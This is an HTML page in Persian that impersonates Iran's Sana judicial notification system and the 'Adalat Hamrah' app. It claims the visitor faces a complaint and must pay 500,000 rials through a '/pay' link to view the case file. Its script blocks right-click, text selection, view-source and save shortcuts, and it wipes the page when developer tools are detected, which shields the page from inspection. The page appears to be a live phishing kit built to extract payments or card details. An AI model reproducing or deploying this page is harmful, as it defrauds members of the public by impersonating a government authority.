<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>سامانه احراز هویت ثنا</title>

  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/shabnam-font@v5.0.1/dist/font-face.css" rel="stylesheet">

  <style>
    body {
      font-family: 'Shabnam', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f7f9fc;
    }

    .header {
      background: url('gg.png') no-repeat center top;
      background-size: cover;
      height: 55.5px;
      position: relative;
    }

    .logo {
      background: white;
      border-radius: 50%;
      padding: 4px;
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: -27.5px;
      box-shadow: 0 0 6px rgba(0,0,0,0.05);
    }

    .logo img {
      width: 36px;
      height: 36px;
    }

    .container {
      max-width: 400px;
      margin: 50px auto 30px;
      padding: 0 20px;
      text-align: center;
    }

    .title {
      font-size: 18px;
      font-weight: bold;
      color: #002366;
      margin-top: 5px;
    }

    .subtitle {
      font-size: 14px;
      color: #777;
      margin-bottom: 15px;
    }

    .alert-box {
      background-color: #fff;
      border-radius: 12px;
      padding: 14px;
      font-size: 13px;
      box-shadow: 0 0 4px rgba(0,0,0,0.05);
      margin-top: 30px;
      line-height: 1.8;
      text-align: right;
    }

    .alert-box .title {
      color: #d32f2f;
      font-weight: bold;
      margin-bottom: 6px;
      font-size: 14px;
    }

    .alert-box .number {
      color: #0047ab;
      font-weight: bold;
    }

    .btn-download {
      display: block;
      margin: 35px auto 0;
      padding: 12px 0;
      background-color: #d32f2f; /* قرمز */
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-family: 'Shabnam', sans-serif;
      text-align: center;
      width: 100%;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="logo">
      <img src="logo.png" alt="logo">
    </div>
  </div>

  <div class="container">
    <div class="title">اپلیکیشن عدالت همراه</div>
    <div class="subtitle">بررسی ابلاغ الکترونیک قضایی</div>

    <div class="alert-box">
      <p class="title">مودی گرامی لازم به ذکر است:</p>
      <p>
        برای مشاهده شکایت به شماره <span class="number">1400032856</span> شما باید از طریق درگاه بانکی زیر مبلغ ۵۰۰,۰۰۰ ریال را پرداخت کنید. پس از پرداخت وجه، از طریق اپلیکیشن می‌توانید شکایت مربوطه را بررسی و پیگیری کنید.
      </p>
    </div>

    <a href="/pay" class="btn-download">پرداخت مالیات و مشاهده پرونده</a>
  </div>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>